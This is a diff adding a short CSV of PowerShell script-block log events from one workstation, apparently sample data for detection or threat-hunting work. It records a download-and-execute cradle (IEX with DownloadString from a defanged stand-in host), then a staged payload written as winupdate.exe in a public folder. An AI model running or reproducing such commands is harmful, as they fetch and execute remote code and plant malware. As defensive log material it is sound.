@@ -1,0 +1,4 @@
+_time,host,user,event_code,script_block_id,script_block_text
+2026-06-24T14:03:12Z,WKSTN-042,ACME\\j.smith,4104,ps-0001,"IEX (New-Object Net.WebClient).DownloadString('hxxp://updates-example[.]test/stage.ps1')"
+2026-06-24T14:03:18Z,WKSTN-042,ACME\\j.smith,4104,ps-0002,"New-Item -ItemType Directory -Path C:\\Users\\Public\\Libraries\\Cache -Force"
+2026-06-24T14:03:46Z,WKSTN-042,ACME\\j.smith,4104,ps-0003,"Set-Content -Path C:\\Users\\Public\\Libraries\\Cache\\winupdate.exe -Value $payload"
